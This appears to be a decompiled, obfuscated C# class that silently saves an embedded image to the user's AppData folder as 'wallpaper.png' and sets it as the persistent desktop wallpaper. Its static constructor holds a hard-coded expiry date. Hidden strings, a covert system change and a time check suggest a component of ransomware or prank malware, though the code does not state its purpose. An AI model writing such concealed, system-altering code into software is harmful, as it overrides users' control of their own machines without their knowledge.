using System;
using System.Drawing;
using System.Runtime.InteropServices;

internal class Class8
{
	private static uint uint_0;

	private static uint uint_1;

	private static uint uint_2;

	private static string string_0;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern int SystemParametersInfo(uint uint_3, int int_0, string string_1, uint uint_4);

	public static void smethod_0()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string_0 = folderPath + Class11.smethod_0("\uf8a9\uf882\uf894\uf899\uf899\uf885\uf894\uf885\uf890\uf887\uf8db\uf885\uf89b\uf892", 63733);
		((Image)Class10.Bitmap_0).Save(string_0);
		SystemParametersInfo(uint_0, 0, string_0, uint_1 | uint_2);
	}

	static Class8()
	{
		if (DateTime.Now > new DateTime(637618728382914112L))
		{
			throw new Exception();
		}
		uint_0 = 20u;
		uint_1 = 1u;
		uint_2 = 2u;
	}
}
